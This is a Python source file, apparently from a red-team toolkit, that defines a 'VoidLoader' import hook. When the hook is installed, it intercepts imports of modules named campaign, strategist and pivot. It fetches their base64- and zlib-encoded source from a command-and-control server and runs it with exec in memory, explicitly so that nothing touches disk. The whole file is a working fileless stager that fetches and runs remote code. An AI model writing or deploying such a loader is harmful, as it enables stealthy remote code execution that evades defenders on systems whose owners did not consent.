import sys
import requests
import base64
import zlib
import types
import importlib.abc
import importlib.util
from rich.console import Console

console = Console()

class VoidLoader(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    """
    The Seed.
    Intercepts imports and loads them from the Neural Server into RAM.
    Never touches disk.
    """
    def __init__(self, c2_url="http://localhost:9090"):
        self.c2_url = c2_url
        self.known_modules = ["ant_swarm.red.campaign", "ant_swarm.red.strategist", "ant_swarm.red.pivot"]

    def find_spec(self, fullname, path, target=None):
        if fullname in self.known_modules:
            console.print(f"[VOID] 👻 Intercepting Import: {fullname}")
            return importlib.util.spec_from_loader(fullname, self)
        return None

    def create_module(self, spec):
        return None # Default creation

    def exec_module(self, module):
        short_name = module.__name__.split('.')[-1]
        console.print(f"[VOID] 📡 Streaming Logic for '{short_name}' from Brain...")

        try:
            resp = requests.get(f"{self.c2_url}/stream?module={short_name}")
            if resp.status_code == 200:
                data = resp.json()['payload']

                # 1. Unpack (Quad Obfuscation Reversal)
                decoded = base64.b64decode(data)
                source_code = zlib.decompress(decoded).decode()

                # 2. Execute in RAM
                console.print(f"[VOID] 🧬 Materializing '{short_name}' in Memory...")
                exec(source_code, module.__dict__)

            else:
                raise ImportError(f"Server returned {resp.status_code}")

        except Exception as e:
            console.print(f"[VOID] ❌ Stream Failed: {e}")
            raise ImportError(f"Could not stream {module.__name__}")

def install(c2_url="http://localhost:9090"):
    """
    Activates the Void Loader hook.
    """
    sys.meta_path.insert(0, VoidLoader(c2_url))
    console.print("[VOID] 🕸️ Void Loader Hook Installed. RAM-Only Mode Active.")
